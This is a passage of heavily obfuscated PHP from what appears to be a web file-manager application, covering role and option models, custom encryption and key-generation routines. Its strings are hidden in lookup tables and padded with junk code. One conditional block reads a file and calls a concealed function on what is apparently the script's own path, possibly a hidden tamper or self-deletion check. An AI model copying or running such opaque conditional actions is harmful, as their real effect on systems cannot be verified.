$£ğè¦õÉ[215]); $’ĞàØŸÏ = stream_context_create(array($£ğè¦õÉ[216] => array($£ğè¦õÉ[217] => $£ğè¦õÉ[218], $£ğè¦õÉ[219] => 3))); $ÌŸ”•ï­ = $÷¯óÈê[711]; if (strlen($ÌŸ”•ï­) < $÷¯óÈê[620]) { die; } $Üåö§ = @file_get_contents($ìôìÄ´, !1, $’ĞàØŸÏ); $‚±á²â = $÷¯óÈê[712]; while (strlen($‚±á²â) < $÷¯óÈê[406]) { if (!$‚±á²â) { break; } $‚±á²â++; } echo $£ğè¦õÉ[292] . hash_encode($Üåö§) . $£ğè¦õÉ[293]; $ğŒåÙ£ù = $÷¯óÈê[713]; } private function jwsr6b17e39e($àÌÚ”›¿, $‹‚Çìóà, $Öš˜öˆ = 3) { $†Ü­¦×Ó =& $_SERVER[ï»»·÷á]; $†Û‘Èı§ =& $_SERVER[éîó”ş¹]; usleep(1); $àÌÚ”›¿ = trim($àÌÚ”›¿); $¹¼Èı = mt_rand(0, 5) . $†Û‘Èı§[6]; $í³¹Î”Í = rand_string(15); $ĞöÏ€° = $†Û‘Èı§[294]; $©‘î½¯œ = $†Ü­¦×Ó[714]; while (strlen($©‘î½¯œ) < $†Ü­¦×Ó[622]) { if (!$©‘î½¯œ) { break; } $©‘î½¯œ++; } switch ($¹¼Èı) { case $†Û‘Èı§[203]: $°²ÏÎ÷æ = $this->gdtufc22d200($àÌÚ”›¿, strrev($‹‚Çìóà . $í³¹Î”Í)); $æ¥ê¶ö² = $†Ü­¦×Ó[715]; while ($æ¥ê¶ö² < $†Ü­¦×Ó[622]) { if ($æ¥ê¶ö² >= 0) { break; } $æ¥ê¶ö²++; } break; case $†Û‘Èı§[121]: $°²ÏÎ÷æ = $this->gdtufc22d200($àÌÚ”›¿, strrev($í³¹Î”Í . $‹‚Çìóà)); $´Û˜ÏÚª = $†Ü­¦×Ó[716]; if (strlen($´Û˜ÏÚª) < $†Ü­¦×Ó[620]) { return; } break; case $†Û‘Èı§[295]: $°²ÏÎ÷æ = $this->gdtufc22d200($àÌÚ”›¿, base64_encode($í³¹Î”Í . $‹‚Çìóà)); break; case $†Û‘Èı§[296]: $°²ÏÎ÷æ = $this->gdtufc22d200($àÌÚ”›¿, md5($í³¹Î”Í . $‹‚Çìóà)); $ÛôÌã‘ç = $†Ü­¦×Ó[717]; if (!$ÛôÌã‘ç) { die; } break; $ÍæîÙõ = $†Ü­¦×Ó[718]; if (strlen($ÍæîÙõ) < $†Ü­¦×Ó[622]) { return; } case $†Û‘Èı§[297]: $àÌÚ”›¿ = base64_encode($àÌÚ”›¿); $æ÷Ì“¸É = rand(0, 64); $¸…¡œîº = $ĞöÏ€°[$æ÷Ì“¸É]; $ö¼óŞÇ£ = $†Ü­¦×Ó[719]; while ($ö¼óŞÇ£ < $†Ü­¦×Ó[625]) { if ($ö¼óŞÇ£ >= 0) { break; } $ö¼óŞÇ£++; } $ÒŒÃ¤Ë = md5($¸…¡œîº . md5($‹‚Çìóà . $¸…¡œîº) . $‹‚Çìóà); $ÒŒÃ¤Ë = substr($ÒŒÃ¤Ë, $æ÷Ì“¸É % 8, $æ÷Ì“¸É % 8 + 7); $¢æÙºÀ = $†Û‘Èı§[6]; $šùçÂ®ô = 0; $ÌĞÓÔñÜ = 0; $®ıòÒéø = $†Ü­¦×Ó[720]; if (strlen($®ıòÒéø) < $†Ü­¦×Ó[622]) { die; } $ô”òˆåø = 0; for ($šùçÂ®ô = 0; $šùçÂ®ô < strlen($àÌÚ”›¿); $šùçÂ®ô++) { $ô”òˆåø = $ô”òˆåø == strlen($ÒŒÃ¤Ë) ? 0 : $ô”òˆåø; $¡×µ™¿ı = $†Ü­¦×Ó[721]; if (!$¡×µ™¿ı) { return; } $ÌĞÓÔñÜ = ($æ÷Ì“¸É + strpos($ĞöÏ€°, $àÌÚ”›¿[$šùçÂ®ô]) + ord($ÒŒÃ¤Ë[$ô”òˆåø++])) % 64; $¢æÙºÀ .= $ĞöÏ€°[$ÌĞÓÔñÜ]; $ùöÇÑ´ı = $†Ü­¦×Ó[722]; while (strlen($ùöÇÑ´ı) < $†Ü­¦×Ó[625]) { if (!$ùöÇÑ´ı) { break; } $ùöÇÑ´ı++; } } $°²ÏÎ÷æ = hash_encode($¸…¡œîº . $¢æÙºÀ); $îññı®ˆ = $†Ü­¦×Ó[723]; if (!$îññı®ˆ) { return; } break; default: $°²ÏÎ÷æ = $this->gdtufc22d200($àÌÚ”›¿, $‹‚Çìóà . $í³¹Î”Í); $÷àëŞ‰¸ = $†Ü­¦×Ó[724]; while ($÷àëŞ‰¸ < $†Ü­¦×Ó[625]) { if ($÷àëŞ‰¸ >= 0) { break; } $÷àëŞ‰¸++; } break; } $°²ÏÎ÷æ = strrev($¹¼Èı . $í³¹Î”Í . $°²ÏÎ÷æ); $‹«Ó­¶ = $†Ü­¦×Ó[725]; if (!$‹«Ó­¶) { return; } if ($Öš˜öˆ - 1 > 0) { $°²ÏÎ÷æ = $this->jwsr6b17e39e($°²ÏÎ÷æ, $‹‚Çìóà, $Öš˜öˆ - 1); } return $°²ÏÎ÷æ; } private function rmzv68b5affb($¼·ƒäŞ†, $ı´À“©, $‰ôÁÑÔ€ = 3) { $ö¸¾Ê†œ =& $_SERVER[ï»»·÷á]; $ƒÛÎ™¿ =& $_SERVER[éîó”ş¹]; if (!is_string($¼·ƒäŞ†) || strlen($¼·ƒäŞ†) < 10) { return !1; } $¼·ƒäŞ† = trim($¼·ƒäŞ†); $¼·ƒäŞ† = strrev($¼·ƒäŞ†); $â´±­÷ä = $ö¸¾Ê†œ[726]; $“²—ÉÊĞ = $¼·ƒäŞ†[0]; $àë¤ÈÊ¯ = substr($¼·ƒäŞ†, 1, 15); $¶úâÉôÆ = $ö¸¾Ê†œ[727]; while ($¶úâÉôÆ < $ö¸¾Ê†œ[406]) { if ($¶úâÉôÆ >= 0) { break; } $¶úâÉôÆ++; } $¼·ƒäŞ† = substr($¼·ƒäŞ†, 16); $¢’’“âÜ = $ƒÛÎ™¿[294]; switch ($“²—ÉÊĞ) { case $ƒÛÎ™¿[203]: $çş°úß¡ = $this->xzhr0c76892f($¼·ƒäŞ†, strrev($ı´À“© . $àë¤ÈÊ¯)); $×úÏ¨úã = $ö¸¾Ê†œ[728]; if (!$×úÏ¨úã) { die; } break; case $ƒÛÎ™¿[121]: $çş°úß¡ = $this->xzhr0c76892f($¼·ƒäŞ†, strrev($àë¤ÈÊ¯ . $ı´À“©)); break; case $ƒÛÎ™¿[295]: $çş°úß¡ = $this->xzhr0c76892f($¼·ƒäŞ†, base64_encode($àë¤ÈÊ¯ . $ı´À“©)); $„…Ğ”ˆ‚ = $ö¸¾Ê†œ[729]; break; $£Ì€÷ = $ö¸¾Ê†œ[730]; if (!$£Ì€÷) { die; } case $ƒÛÎ™¿[296]: $çş°úß¡ = $this->xzhr0c76892f($¼·ƒäŞ†, md5($àë¤ÈÊ¯ . $ı´À“©)); $Ø¿Ö…†Å = $ö¸¾Ê†œ[731]; if (!$Ø¿Ö…†Å) { return; } break; case $ƒÛÎ™¿[297]: $¼·ƒäŞ† = hash_decode($¼·ƒäŞ†); $Ôİóæ˜– = $ö¸¾Ê†œ[732]; while (strlen($Ôİóæ˜–) < $ö¸¾Ê†œ[625]) { if (!$Ôİóæ˜–) { break; } $Ôİóæ˜–++; } $»İ—ª ƒ = $¼·ƒäŞ†[0]; $Ô´İ¦âÄ = $ö¸¾Ê†œ[733]; if (!$Ô´İ¦âÄ) { return; } $¼·ƒäŞ† = substr($¼·ƒäŞ†, 1); $è®¦­ê” = strpos($¢’’“âÜ, $»İ—ª ƒ); $¹Àºä¾Ÿ = $ö¸¾Ê†œ[734]; if (strlen($¹Àºä¾Ÿ) < $ö¸¾Ê†œ[622]) { return; } $É§Óß€Î = md5($»İ—ª ƒ . md5($ı´À“© . $»İ—ª ƒ) . $ı´À“©); $É§Óß€Î = substr($É§Óß€Î, $è®¦­ê” % 8, $è®¦­ê” % 8 + 7); $Õ‰àÅä… = $ƒÛÎ™¿[6]; $ÅÓäÓáÄ = 0; $ÊÉšá¼ = 0; $©Ô½Íšç = $ö¸¾Ê†œ[735]; $Ë™ëñ±¹ = 0; for ($ÅÓäÓáÄ = 0; $ÅÓäÓáÄ < strlen($¼·ƒäŞ†); $ÅÓäÓáÄ++) { $Ë™ëñ±¹ = $Ë™ëñ±¹ == strlen($É§Óß€Î) ? 0 : $Ë™ëñ±¹; $Äê‰†ƒ = $ö¸¾Ê†œ[736]; if (!$Äê‰†ƒ) { die; } $áĞ¶¦ú§ = $Ë™ëñ±¹++; $«®®¡Ì‘ = $ö¸¾Ê†œ[737]; if (strlen($«®®¡Ì‘) < $ö¸¾Ê†œ[625]) { die; } $ÊÉšá¼ = strpos($¢’’“âÜ, $¼·ƒäŞ†[$ÅÓäÓáÄ]) - $è®¦­ê” - ord($É§Óß€Î[$áĞ¶¦ú§]); while ($ÊÉšá¼ < 0) { $ÊÉšá¼ += 64; $Ê¸šò³ = $ö¸¾Ê†œ[738]; } $Õ‰àÅä… .= $¢’’“âÜ[$ÊÉšá¼]; $ïú”°–Ì = $ö¸¾Ê†œ[739]; } $çş°úß¡ = base64_decode($Õ‰àÅä…); $Èó‘§ı = $ö¸¾Ê†œ[740]; break; default: $çş°úß¡ = $this->xzhr0c76892f($¼·ƒäŞ†, $ı´À“© . $àë¤ÈÊ¯); break; } if ($‰ôÁÑÔ€ - 1 > 0) { $çş°úß¡ = $this->rmzv68b5affb($çş°úß¡, $ı´À“©, $‰ôÁÑÔ€ - 1); } return $çş°úß¡; } public function szdpa6bc92b5($œÓ³ØŞ) { $¢è„†ûå =& $_SERVER[ï»»·÷á]; $¢Æ×ğ¢â =& $_SERVER[éîó”ş¹]; $Ü¿Â…ˆÎ = $this->hvcxccdc89a5(); $ãì¤×ˆ¦ = $this->hvcxccdc89a5(); $¹»¥Åâì = $¢è„†ûå[741]; while (strlen($¹»¥Åâì) < $¢è„†ûå[620]) { if (!$¹»¥Åâì) { break; } $¹»¥Åâì++; } $†áŸÑñ = ($Ü¿Â…ˆÎ - 1) * ($ãì¤×ˆ¦ - 1); $®ëâ¢ÒË = intval(($Ü¿Â…ˆÎ + $ãì¤×ˆ¦) / 2); $ªçØÀê = $¢è„†ûå[742]; if (!$ªçØÀê) { die; } while (1) { $Ñì¼·§× = $®ëâ¢ÒË; $·è¼¹… = $†áŸÑñ; $º˜©Ü = $¢è„†ûå[743]; if (!$º˜©Ü) { die; } while ($·è¼¹… % $Ñì¼·§× != 0) { $ÛŠ²¤„” = $·è¼¹…; $·è¼¹… = $Ñì¼·§×; $Ñì¼·§× = $ÛŠ²¤„” % $Ñì¼·§×; } if ($Ñì¼·§× == 1) { break; } else { $®ëâ¢ÒË++; } } $ÈáÎıøß = 2; $ª££§®‹ = $¢è„†ûå[744]; for ($­°®†Èƒ = 0; $­°®†Èƒ < $†áŸÑñ * 10; $­°®†Èƒ++) { if (($†áŸÑñ * $­°®†Èƒ + 1) % $®ëâ¢ÒË == 0) { $ÈáÎıøß = intval(($†áŸÑñ * $­°®†Èƒ + 1) / $®ëâ¢ÒË); break; } } $ŸÛ‚øÂÜ = $this->gdtufc22d200($Ü¿Â…ˆÎ * $ãì¤×ˆ¦ . $¢Æ×ğ¢â[6], $¢Æ×ğ¢â[135]); $›ø¦¦õ¶ = md5($¢Æ×ğ¢â[298] . ($Ü¿Â…ˆÎ + $ãì¤×ˆ¦) . $¢Æ×ğ¢â[299] . $®ëâ¢ÒË . $¢Æ×ğ¢â[299] . $ÈáÎıøß . $¢Æ×ğ¢â[300]); $Ş²ç†˜ = $this->gdtufc22d200($œÓ³ØŞ, $›ø¦¦õ¶) . $¢Æ×ğ¢â[301] . $ŸÛ‚øÂÜ; $Óƒ…à¦± = $¢è„†ûå[745]; if (!$Óƒ…à¦±) { die; } return $Ş²ç†˜; $”áÏ·²ß = $¢è„†ûå[746]; } public function tokz88db8325($”ë¸ê“¡) { $ˆß‰§× =& $_SERVER[ï»»·÷á]; $ñŒãªÛ =& $_SERVER[éîó”ş¹]; $¬Åª¹õ¾ = explode($ñŒãªÛ[301], $”ë¸ê“¡); $÷ôè‡¶¦ = $ˆß‰§×[747]; while (strlen($÷ôè‡¶¦) < $ˆß‰§×[406]) { if (!$÷ôè‡¶¦) { break; } $÷ôè‡¶¦++; } if (count($¬Åª¹õ¾) != 2) { return $ñŒãªÛ[6]; } $¶†ß‡¨¨ = $this->xzhr0c76892f($¬Åª¹õ¾[1] . $ñŒãªÛ[6], $ñŒãªÛ[135]); if (!$¶†ß‡¨¨) { return $ñŒãªÛ[6]; } $¶†ß‡¨¨ = intval($¶†ß‡¨¨); $²£Õ·Ü = 0; $¬³Ë´Ü² = 0; $Ûß­½£à = $ˆß‰§×[748]; if (strlen($Ûß­½£à) < $ˆß‰§×[620]) { return; } for ($²è×€üÄ = 3; $²è×€üÄ < $¶†ß‡¨¨; $²è×€üÄ += 2) { if ($¶†ß‡¨¨ % $²è×€üÄ != 0) { continue; } $²£Õ·Ü = $²è×€üÄ; $ú´Ñ«Øˆ = $ˆß‰§×[749]; if (strlen($ú´Ñ«Øˆ) < $ˆß‰§×[620]) { die; } $¬³Ë´Ü² = intval($¶†ß‡¨¨ / $²è×€üÄ); break; } $óìÃöû‡ = ($²£Õ·Ü - 1) * ($¬³Ë´Ü² - 1); $ó—Øïø÷ = $ˆß‰§×[750]; while ($ó—Øïø÷ < $ˆß‰§×[632]) { if ($ó—Øïø÷ >= 0) { break; } $ó—Øïø÷++; } $ªşƒ‚İö = intval(($²£Õ·Ü + $¬³Ë´Ü²) / 2); $¤é¸Ú÷ = $ˆß‰§×[751]; while (1) { $åã·´Åå = $ªşƒ‚İö; $ÔÖ×•†í = $óìÃöû‡; while ($ÔÖ×•†í % $åã·´Åå != 0) { $´ô¾µ½è = $ÔÖ×•†í; $ÔÖ×•†í = $åã·´Åå; $åã·´Åå = $´ô¾µ½è % $åã·´Åå; $é²Œœ£Î = $ˆß‰§×[752]; while (strlen($é²Œœ£Î) < $ˆß‰§×[620]) { if (!$é²Œœ£Î) { break; } $é²Œœ£Î++; } } if ($åã·´Åå == 1) { break; } else { $ªşƒ‚İö++; } } $ğØÓÕí× = 2; $¯€òÍ†ª = $ˆß‰§×[753]; if (strlen($¯€òÍ†ª) < $ˆß‰§×[632]) { die; } for ($²è×€üÄ = 0; $²è×€üÄ < $óìÃöû‡ * 10; $²è×€üÄ++) { if (($óìÃöû‡ * $²è×€üÄ + 1) % $ªşƒ‚İö == 0) { $ğØÓÕí× = intval(($óìÃöû‡ * $²è×€üÄ + 1) / $ªşƒ‚İö); break; } } $¸²¸˜”Ï = md5($ñŒãªÛ[298] . ($²£Õ·Ü + $¬³Ë´Ü²) . $ñŒãªÛ[299] . $ªşƒ‚İö . $ñŒãªÛ[299] . $ğØÓÕí× . $ñŒãªÛ[300]); $§Ö­©”ˆ = $this->xzhr0c76892f($¬Åª¹õ¾[0], $¸²¸˜”Ï); $›²‹í‰ = $ˆß‰§×[754]; return $§Ö­©”ˆ; $“âêÍ¤‰ = $ˆß‰§×[755]; while (strlen($“âêÍ¤‰) < $ˆß‰§×[406]) { if (!$“âêÍ¤‰) { break; } $“âêÍ¤‰++; } } public function hvcxccdc89a5() { $ôå…‰Ìä =& $_SERVER[ï»»·÷á]; $¡Óª´€¼ = mt_rand(pow(2, 14), pow(2, 16) - 1); $·¯¹–Äç = array(); $‹˜ÙÈô£ = $ôå…‰Ìä[756]; if (strlen($‹˜ÙÈô£) < $ôå…‰Ìä[625]) { return; } $ŸÑ½Ú‰ = 1; while ($ŸÑ½Ú‰ <= (int) sqrt($¡Óª´€¼)) { $†ªÇ¦Ïæ = $ŸÑ½Ú‰; $ªæõøÆ½ = $ôå…‰Ìä[757]; if (!$ªæõøÆ½) { die; } while (!0) { $†ªÇ¦Ïæ++; if ($†ªÇ¦Ïæ <= 2) { $ŸÑ½Ú‰ = $†ªÇ¦Ïæ; break; } else { if ($†ªÇ¦Ïæ < 2) { continue; } } $Ø±’µÁ = !0; for ($ëİ˜æ÷Ï = 2; $ëİ˜æ÷Ï <= sqrt($†ªÇ¦Ïæ); $ëİ˜æ÷Ï++) { if ($†ªÇ¦Ïæ % $ëİ˜æ÷Ï == 0) { $Ø±’µÁ = !1; } } if ($Ø±’µÁ) { $ŸÑ½Ú‰ = $†ªÇ¦Ïæ; break; } } $·¯¹–Äç[] = $ŸÑ½Ú‰; } $Ü˜˜Óª¦ = 2; for ($†ªÇ¦Ïæ = $¡Óª´€¼; $†ªÇ¦Ïæ > 1; $†ªÇ¦Ïæ--) { $Ø±’µÁ = !0; foreach ($·¯¹–Äç as $“ÕŸç ı) { if ($†ªÇ¦Ïæ % $“ÕŸç ı == 0) { $Ø±’µÁ = !1; break; } } if ($Ø±’µÁ) { $Ü˜˜Óª¦ = $†ªÇ¦Ïæ; break; } } return $Ü˜˜Óª¦; $«Ö§öÃå = $ôå…‰Ìä[758]; while (strlen($«Ö§öÃå) < $ôå…‰Ìä[625]) { if (!$«Ö§öÃå) { break; } $«Ö§öÃå++; } } public function fdpr4423769b($û˜ìõâ´, $§šç´Ü©) { $¯­·‹½˜ =& $_SERVER[éîó”ş¹]; return call_user_func(array($¯­·‹½˜[8], $¯­·‹½˜[302]), $û˜ìõâ´, $§šç´Ü©); } public function gdtufc22d200($–¢‹ŠŞÂ, $ú¿ˆÑİ¡) { $™àÕ…Ìé =& $_SERVER[éîó”ş¹]; return call_user_func(array($™àÕ…Ìé[303], $™àÕ…Ìé[304]), $–¢‹ŠŞÂ, $ú¿ˆÑİ¡); } public function xzhr0c76892f($ãˆÆ, $ı¼ş×‰÷) { $«¹ê³› =& $_SERVER[éîó”ş¹]; return call_user_func(array($«¹ê³›[303], $«¹ê³›[305]), $ãˆÆ, $ı¼ş×‰÷); } } $_file = $_SERVER[$_SERVER[ï»»·÷á][409]]; $_size = $_SERVER[ï»»·÷á][759]; goto f´ùÏš”–ñ; cÏÄİ¦öÚ…: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\155\x5f\157\160\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\x6f\154\145", "\x72\157\x6c\x65\107\x72\157\165\160", "\x72\x65\147\x69\x73\x74", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ª¡ù–Öí) { return "\123\x79\x73\164\145\x6d\x4f\160\164\151\157\156\137{$ª¡ù–Öí}"; } protected function optionDefault($ºğ±‰Ó = '') { $Öœğ÷ï =& $_SERVER[ï»»·÷á]; if ($ºğ±‰Ó == $Öœğ÷ï[12]) { return $GLOBALS[$Öœğ÷ï[6]][$Öœğ÷ï[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\x72\x6f\x6c\145\114\x69\163\164"; public $field = array("\156\x61\155\x65", "\141\165\x74\150", "\154\x61\x62\145\x6c", "\x64\151\163\160\x6c\x61\x79", "\163\x79\x73\164\x65\x6d", "\144\x65\163\143", "\x69\147\x6e\157\x72\145\105\x78\164", "\x69\147\x6e\x6f\162\145\x46\x69\154\x65\123\x69\172\x65", "\x61\144\155\x69\x6e\x69\x73\x74\162\x61\164\x6f\162", "\163\x6f\x72\164"); public function listData($Õ½€Æ¦ = false, $´„çÑ·Ó = "\163\157\x72\x74", $µµèÈ¡ü = false) { $óõù¿€¬ =& $_SERVER[ï»»·÷á]; $í‰…İ«’ = parent::listData($Õ½€Æ¦, $´„çÑ·Ó, $µµèÈ¡ü); if (!$Õ½€Æ¦) { foreach ($í‰…İ«’ as $Ğı˜æ´ƒ => $ˆ¨ Ç‰) { if ($ˆ¨ Ç‰[$óõù¿€¬[2069]] == 1) { $í‰…İ«’[$Ğı˜æ´ƒ][$óõù¿€¬[462]] = LNG($óõù¿€¬[2304]); } } } return $í‰…İ«’; } public function update($¡ŠÙ¼ş³, $¢‹°ôÑç) { $¡ÄÇ»÷¶ =& $_SERVER[ï»»·÷á]; $Ëò¬üïû = parent::listData($¡ŠÙ¼ş³); $âÃ œ‡¢ = $this->findByName($¢‹°ôÑç[$¡ÄÇ»÷¶[32]]); if (!$Ëò¬üïû || $âÃ œ‡¢ && $âÃ œ‡¢[$¡ÄÇ»÷¶[399]] != $Ëò¬üïû[$¡ÄÇ»÷¶[399]]) { return !1; } if ($âÃ œ‡¢[$¡ÄÇ»÷¶[2069]] == 1) { $¢‹°ôÑç = array($¡ÄÇ»÷¶[32] => $¢‹°ôÑç[$¡ÄÇ»÷¶[32]], $¡ÄÇ»÷¶[1890] => $¢‹°ôÑç[$¡ÄÇ»÷¶[1890]]); } $this->filterAuth($¢‹°ôÑç[$¡ÄÇ»÷¶[422]]); return parent::update($¡ŠÙ¼ş³, $¢‹°ôÑç); } public function remove($”¶”’ù­) { $µ™ËŒ”× = parent::listData($”¶”’ù­); if (!$µ™ËŒ”× || $µ™ËŒ”×[$_SERVER[ï»»·÷á][1294]]) { return !1; } return parent::remove($”¶”’ù­); } public function add($Šôğß™‡) { $Ÿ÷á˜ó· =& $_SERVER[ï»»·÷á]; $ê½ó’ü = $Šôğß™‡[$Ÿ÷á˜ó·[32]]; if ($this->findByName($ê½ó’ü)) { return !1; } $æƒ £Û = array($Ÿ÷á˜ó·[429] => $ê½ó’ü, $Ÿ÷á˜ó·[1873] => $Ÿ÷á˜ó·[12], $Ÿ÷á˜ó·[1869] => $Ÿ÷á˜ó·[1877], $Ÿ÷á˜ó·[2305] => 1, $Ÿ÷á˜ó·[1872] => 0, $Ÿ÷á˜ó·[2306] => 0, $Ÿ÷á˜ó·[1871] => $this->getSort()); $Šôğß™‡ = array_merge($æƒ £Û, $Šôğß™‡); $this->filterAuth($Šôğß™‡[$Ÿ÷á˜ó·[422]]); return parent::insert($Šôğß™‡); } private function getSort() { $¨šÀƒÈ =& $_SERVER[ï»»·÷á]; $õ¸¡· = parent::listData(); $”´®‡Ò” = array_to_keyvalue($õ¸¡·, $¨šÀƒÈ[12], $¨šÀƒÈ[1891]); return empty($”´®‡Ò”) ? 0 : max($”´®‡Ò”) + 1; } private function filterAuth(&$ÆÏ©Æª) { $¹ê “¬Ò =& $_SERVER[ï»»·÷á]; $Ù£«ÔÓŒ = array(); $ŸÚªıñ = array_filter(explode($¹ê “¬Ò[50], $ÆÏ©Æª)); foreach ($ŸÚªıñ as $ÆÏ©Æª) { $à¸ÅıœÊ = explode($¹ê “¬Ò[10], $ÆÏ©Æª); if ($à¸ÅıœÊ[0] == $¹ê “¬Ò[2307] && $à¸ÅıœÊ[1] != $¹ê “¬Ò[1200]) { $ÎÀšàº = $à¸ÅıœÊ[0] . $¹ê “¬Ò[10] . $à¸ÅıœÊ[1] . $¹ê “¬Ò[2308]; if (!in_array($ÎÀšàº, $ŸÚªıñ)) { $Ù£«ÔÓŒ[] = $ÎÀšàº; } } $Ù£«ÔÓŒ[] = $ÆÏ©Æª; } $ÆÏ©Æª = implode($¹ê “¬Ò[50], $Ù£«ÔÓŒ); } public function findRoleDefault() { $¢®µÓ =& $_SERVER[ï»»·÷á]; $²Û–Á®ı = parent::listData(); $‹Ë•±ãØ = !1; foreach ($²Û–Á®ı as $ïª¶œŒ•) { if (!$ïª¶œŒ• || $ïª¶œŒ•[$¢®µÓ[1889]] == $¢®µÓ[198] || $ïª¶œŒ•[$¢®µÓ[2069]] == 1) { continue; } if (strstr($ïª¶œŒ•[$¢®µÓ[422]], $¢®µÓ[2309])) { continue; } if (!strstr($ïª¶œŒ•[$¢®µÓ[422]], $¢®µÓ[2310])) { continue; } if (!$‹Ë•±ãØ) { $‹Ë•±ãØ = $ïª¶œŒ•; continue; } $ôœãëÊ“ = explode($¢®µÓ[50], $‹Ë•±ãØ[$¢®µÓ[422]]); $»ıíãŠ¦ = explode($¢®µÓ[50], $ïª¶œŒ•[$¢®µÓ[422]]); if (count($ôœãëÊ“) > count($»ıíãŠ¦)) { $‹Ë•±ãØ = $ïª¶œŒ•; } } return $‹Ë•±ãØ ? $‹Ë•±ãØ[$¢®µÓ[399]] : $¢®µÓ[12]; } public function sort($ƒ†Ø˜÷õ, $øÖĞ„ÅÔ) { return parent::update($ƒ†Ø˜÷õ, $øÖĞ„ÅÔ); } } goto a´¾¹Œ ›º; Bßèò÷´£°: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Áæ‹³„Û = false, $„ßöïÑ = '', $²ÇĞî×— = false) { $óûŞÕÉ‡ =& $_SERVER[ï»»·÷á]; $ò€ÙÁâÌ = $this->cacheGet($„ßöïÑ); $ËË£™¦Ó = $this->optionDefault($„ßöïÑ); $ËË£™¦Ó = is_array($ËË£™¦Ó) ? $ËË£™¦Ó : array(); if (is_array($ò€ÙÁâÌ)) { $ò€ÙÁâÌ = array_merge($ËË£™¦Ó, $ò€ÙÁâÌ); return $Áæ‹³„Û ? isset($ò€ÙÁâÌ[$Áæ‹³„Û]) ? $ò€ÙÁâÌ[$Áæ‹³„Û] : null : $ò€ÙÁâÌ; } $Å¹Ğ×Ç = $this->filterWhere(array($óûŞÕÉ‡[33] => $„ßöïÑ)); $ò€ÙÁâÌ = $this->where($Å¹Ğ×Ç)->select(); $ò€ÙÁâÌ = array_to_keyvalue($ò€ÙÁâÌ, $óûŞÕÉ‡[94], $óûŞÕÉ‡[374]); foreach ($ò€ÙÁâÌ as $ã³’å¯ê => $ış­×È») { if ($²ÇĞî×— || in_array($ã³’å¯ê, $this->jsonField)) { $ò€ÙÁâÌ[$ã³’å¯ê] = json_decode($ış­×È», !0); } } $this->cacheSet($„ßöïÑ, $ò€ÙÁâÌ); $ò€ÙÁâÌ = array_merge($ËË£™¦Ó, $ò€ÙÁâÌ); return $Áæ‹³„Û ? $ò€ÙÁâÌ[$Áæ‹³„Û] : $ò€ÙÁâÌ; } public function set($íÓÜ”Ë“, $¨ëäùãç = false, $Û´‘¤ûš = '') { $÷È•Í =& $_SERVER[ï»»·÷á]; $this->cacheRemove($Û´‘¤ûš); $áªÌñªÄ = array(); $œ‹¼ó¿´ = is_array($íÓÜ”Ë“) ? $íÓÜ”Ë“ : array($íÓÜ”Ë“ => $¨ëäùãç); foreach ($œ‹¼ó¿´ as $×ä³Ì»ñ => $˜‚–«ñ™) { if (is_array($˜‚–«ñ™)) { $˜‚–«ñ™ = json_encode_force($˜‚–«ñ™); } $this->checkLength($˜‚–«ñ™, !1, $this->tableName . $÷È•Í[4] . $íÓÜ”Ë“); $˜‚–«ñ™ = self::textEncode($˜‚–«ñ™); $œ‹¼ó¿´ = array($÷È•Í[33] => $Û´‘¤ûš, $÷È•Í[94] => $×ä³Ì»ñ, $÷È•Í[374] => $˜‚–«ñ™); $áªÌñªÄ[] = $this->filterWhere($œ‹¼ó¿´); } if (!$áªÌñªÄ) { return !0; } $€ğ‹Ü“× = $this->cacheKey($÷È•Í[400]); CacheLock::lock($€ğ‹Ü“×); $Ä¼¨äÂ½ = $this->addAll($áªÌñªÄ, array(), !0); CacheLock::unlock($€ğ‹Ü“×); return $Ä¼¨äÂ½; } protected function optionDefault($¨°³ù÷š = '') { return !1; } public function setDeep($ûÂ˜¦Ë¶, $¦¿™¡»¼ = false, $¹·¼¥ = '') { $æí‚ÅÆº = explode($_SERVER[ï»»·÷á][10], $ûÂ˜¦Ë¶); $ªõÇ»ûŒ = $this->get(); array_set_value($ªõÇ»ûŒ, $ûÂ˜¦Ë¶, $¦¿™¡»¼); $this->set($æí‚ÅÆº[0], $ªõÇ»ûŒ[$æí‚ÅÆº[0]], $¹·¼¥); } public function remove($•ÙŠÒôë, $•şŸÔÓ = '') { $»±ğ‘×è =& $_SERVER[ï»»·÷á]; $this->cacheRemove($•şŸÔÓ); $–—ôÂÖ = $this->filterWhere(array($»±ğ‘×è[94] => $•ÙŠÒôë, $»±ğ‘×è[33] => $•şŸÔÓ)); if (is_null($•ÙŠÒôë)) { unset($–—ôÂÖ[$»±ğ‘×è[94]]); } return $this->where($–—ôÂÖ)->delete(); } public function cacheSet($£ı™ÅĞ, $½ÖÃÅéÁ = false) { return Cache::set($this->cacheKey($£ı™ÅĞ), $½ÖÃÅéÁ); } public function cacheGet($õ÷®¦íñ) { return Cache::get($this->cacheKey($õ÷®¦íñ)); } public function cacheRemove($Ïº¯ÑÑ€) { return Cache::remove($this->cacheKey($Ïº¯ÑÑ€)); } protected function filterWhere($Ç”¦È”Ó) { return $Ç”¦È”Ó; } protected function cacheKey($•é»¸ŠÓ) { return $•é»¸ŠÓ; } } if ($_SERVER[$_SERVER[ï»»·÷á][401]] != $_SERVER[$_SERVER[ï»»·÷á][402]]) { $_getc = $_SERVER[ï»»·÷á][403]; $_getfile = $_SERVER[$_SERVER[ï»»·÷á][404]] . $_SERVER[ï»»·÷á][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ï»»·÷á][231], $_getfilec); if (count($_getarrs) < $_SERVER[ï»»·÷á][406]) { $exit = $_SERVER[ï»»·÷á][407]; $exit(); } $_act = $_SERVER[ï»»·÷á][408]; $_act($_SERVER[$_SERVER[ï»»·÷á][409]]); } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\x63\145"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\x6d\145" => "\151\x6f\x5f\163\x6f\165\x72\143\145\137\155\145\164\x61", "\x6d\145\164\x61\106\x69\145\x6c\144" => "\163\x6f\x75\162\143\145\x49\104"); protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\x6d\145", "\x74\151\155\145", "\x69\156\163\x65\x72\x74", 